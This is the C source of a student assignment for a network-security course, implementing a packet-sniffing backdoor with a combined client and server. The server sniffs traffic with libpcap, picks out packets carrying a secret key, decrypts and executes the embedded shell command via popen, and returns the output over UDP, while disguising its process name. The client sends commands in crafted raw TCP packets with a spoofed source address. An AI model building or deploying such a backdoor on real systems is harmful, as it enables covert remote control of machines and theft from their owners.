/*
| ------------------------------------------------------------------------------
| File:     bd.c
| Purpose:  COMP 8505 Assignment 2
| Authors:  Kevin Eng, Jeremy Tsang
| Date:     Oct 6, 2014
| 
| Notes:    A packet-sniffing backdoor in C. This program includes the client
|           and server together as one main executable.
|
|           Compile using 'make clean' and 'make'.
|
|           Usage: ./backdoor -h
| 
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include "bd.h"

/*
| ------------------------------------------------------------------------------
| Main Function
| ------------------------------------------------------------------------------
*/

int main(int argc, char **argv){

    /* Make sure is root user */
    
    if(geteuid() != 0){
        printf("Must be root user.\n");
        return 1;
    }

    /* Parse arguments */
    
    int is_server = 0;
    struct client_opt c_opt;
    c_opt.target_host[0] = '\0';
    c_opt.command[0] = '\0';
    c_opt.target_port = 0;
    struct server_opt s_opt;
    s_opt.device[0] = '\0';
    
    int opt;
    while((opt = getopt(argc, argv, "hsc:d:p:x:")) != -1){
        switch(opt){
            case 'h':
                usage();
                return 0;
                break;
            case 's':
                is_server = 1;
                break;
            case 'c':
                strcpy(s_opt.device, optarg);
                break;
            case 'd':
                strcpy(c_opt.target_host, optarg);
                break;
            case 'p':
                c_opt.target_port = atoi(optarg);
                break;
            case 'x':
                strcpy(c_opt.command, optarg);
                break;
            default:
                printf("Type -h for usage help.\n");
                return 1;
        }
    }
    
    mask_process(argv, PROCESS_NAME);

    /* Validation then run client or server */
    
    if(is_server){
        if(s_opt.device[0] == '\0'){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            server(s_opt);
	    
        }
    }
    else{
        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            client(c_opt);
        }
    }
    
    return 0;
}

/*
| ------------------------------------------------------------------------------
| Client
| ------------------------------------------------------------------------------
*/

void client(struct client_opt c_opt){

    /* Display options */

    printf("Running client...\n");
    printf("Target Host: %s\n",c_opt.target_host);
    printf("Target Port: %d\n",c_opt.target_port);
    printf("Command: %s\n",c_opt.command);
    
    /* Encrypt command */
    
    char *bd_message;
    bd_message = encrypt(c_opt.command);
    
    /* Set packet options and send packet */
    
    struct addr_info user_addr;
    user_addr.shost = DEFAULT_SRC_IP;
    user_addr.sport = DEFAULT_SRC_PORT;
    user_addr.dhost = c_opt.target_host;
    user_addr.dport = c_opt.target_port;
    user_addr.raw_socket = 0;
    
    // Create a raw socket and set SO_REUSEADDR
    user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    int arg = 1;
    if(setsockopt(user_addr.raw_socket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    // Send packet
    send_datagram(&user_addr, bd_message);
    
    /* Receive reply and print */
    
    // Initialize variables
    printf("Waiting for reply...\n");
    int sockfd, n;
    struct sockaddr_in server, client;
    memset(&server, 0, sizeof(struct sockaddr_in));
    memset(&client, 0, sizeof(struct sockaddr_in));
    
    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    arg = 1;
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    // Setup server info and bind
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(DEFAULT_DST_PORT);
    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    
    // Receive UDP packet and print results
    char reply[BD_MAX_REPLY_LEN];
    memset(reply, 0, BD_MAX_REPLY_LEN);
    socklen_t client_len = sizeof(client);
    printf("recvfrom...\n");
    n = recvfrom(sockfd, reply, sizeof(reply), 0, (struct sockaddr *)&client, &client_len);
    reply[n] = 0;
    printf("Reply: \n");
    printf("%s\n", reply);
    
    /* Cleanup */
    
    free(bd_message);
    close(sockfd);
}

/*
| ------------------------------------------------------------------------------
| Server
| ------------------------------------------------------------------------------
*/

void server(struct server_opt s_opt){

    printf("Running server...\n");

    /* Mask process name */
    
    
    /* Raise privileges */
    
    /* Initialize variables and functions */
    
    pcap_t *handle;                 /* Session handle */
    char *dev;                      /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;          /* The compiled filter */
    char filter_exp[] = "port 12345"; /* The filter expression */
    bpf_u_int32 mask;               /* Our netmask */
    bpf_u_int32 net;                /* Our IP */
    
    // Get network interface
    dev = s_opt.device; //dev = "wlp4s5"; //dev = pcap_lookupdev(errbuf);
    if(dev == NULL) {
        printf("Couldn't find default device: %s\n", errbuf);
        system_fatal("pcap_lookupdev");
    }
    printf("Device: %s\n", dev);
    
    // Get interface properties
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    
    // Open sniffing session
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        system_fatal("pcap_open_live");
    }
    
    /* Build packet filter */
    
    // Compile filter
    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_compile");
    }
    
    // Apply filter
    if(pcap_setfilter(handle, &fp) == -1){
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_setfilter");
    }
    printf("Filter: %s\n", filter_exp);
    
    /* Packet capture loop */
    
    // Grab a packet
	//packet = pcap_next(handle, &header);
	
	// Close the session
	//pcap_close(handle);
	
	// Packet capture loop
	pcap_loop(handle, -1, packet_handler, NULL);
}

/*
| ------------------------------------------------------------------------------
| Send Raw Packet
| ------------------------------------------------------------------------------
*/

int send_datagram(struct addr_info *user_addr, char *data){
    
    /* Declare variables */
    
    // Typecast datagram
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
    
    pseudo_header psh;
    int data_len = strlen(data);
    
    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE);

    /* IP header */

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
    iph->id = htonl(DEFAULT_IP_ID);
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = sin.sin_addr.s_addr;
 
    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* TCP header */
    
    tcph->source = htons(user_addr->sport);
    tcph->dest = htons(user_addr->dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // Data Offset is set to the TCP header length 
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(WIN_SIZE);
    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
    tcph->urg_ptr = 0;
   
    /* Data */
    
    strcpy(data_ptr, data);
      
    /* Calculate Checksum */
    
    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    psh.data = data;
    
    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_header));
 
    /* Build our own header */
    
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            system_fatal("setsockopt");
    }
 
    /* Send the packet */
    
    if(sendto(user_addr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        system_fatal("sendto");
        return -1;
    }
    else{
        printf("Sent command!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Packet Handler Function
| ------------------------------------------------------------------------------
*/

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
    
    /* Parse packet */
    
    // Print its length
	printf("Jacked a packet with length of [%d]\n", header->len);
    
    // Get packet info
    struct tcp_ip_packet packet_info;
    if(tcp_ip_typecast(packet, &packet_info) == 0){
        //printf("tcp_ip_typecast");
        return;
    }
    printf("Payload (len:%zu): %s\n", strlen((char *)packet_info.payload), packet_info.payload);
    
    /* Check the packet for the key meant for the backdoor */
    
    if(strncmp((char *)packet_info.payload, BD_KEY, BD_KEY_LEN) != 0){
        printf("Not for backdoor, discard.\n");
        return;
    }
    else
        printf("Got message!\n");
    
    /* Decrypt remaining packet data */
    
    char *bd_command;
    bd_command = decrypt((char *)packet_info.payload);
    
    // Execute command
    FILE *fp;
    fp = popen(bd_command, "r");
    if(fp == NULL){
        printf("Command error!\n");
        return;
    }
    printf("Command executed.\n");  
    
    /* Send results back to client */
    
    // Open UDP socket
    int sockfd;
    struct sockaddr_in dst_host;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    int arg = 1;
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");
    
    memset(&dst_host, 0, sizeof(struct sockaddr_in));
    dst_host.sin_family = AF_INET;
    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
    dst_host.sin_port = packet_info.tcp->th_sport;
    
    // Send results from popen command
    char output[BD_MAX_REPLY_LEN];
    memset(output, 0, BD_MAX_REPLY_LEN);
    fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
    
    /* Cleanup */
    
    free(bd_command);
    close(sockfd);
    pclose(fp);
}

/*
| ------------------------------------------------------------------------------
| Mask process under daemon
| ------------------------------------------------------------------------------
*/

void mask_process(char *argv[], char *name){
    
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], name);
    prctl(PR_SET_NAME, name, 0, 0);
}

/*
| ------------------------------------------------------------------------------
| Usage printout
| ------------------------------------------------------------------------------
*/

void usage(){
    
    printf("\n");
    printf("COMP 8505 Assignment 2 - Packet Sniffing Backdoor\n");
    printf("Usage: ./backdoor [OPTIONS]\n");
    printf("---------------------------\n");
    printf("  -h                    Display this help.\n");
    printf("CLIENT (default)\n");
    printf("  -d <target_host>      The target host where the backdoor server is running.\n");
    printf("  -p <target_port>      The target port to send to.\n");
    printf("  -x <command>          The command to run on the target host.\n");
    printf("SERVER\n");
    printf("  -s                    Enables server mode.\n");
    printf("  -c <device_name>      Network interface device name.\n");
    printf("\n");
}

/*
| ------------------------------------------------------------------------------
| Fatal error
| ------------------------------------------------------------------------------
*/

// Prints the error stored in errno and aborts the program.
static void system_fatal(const char* message) {
    perror(message);
    exit(EXIT_FAILURE);
}
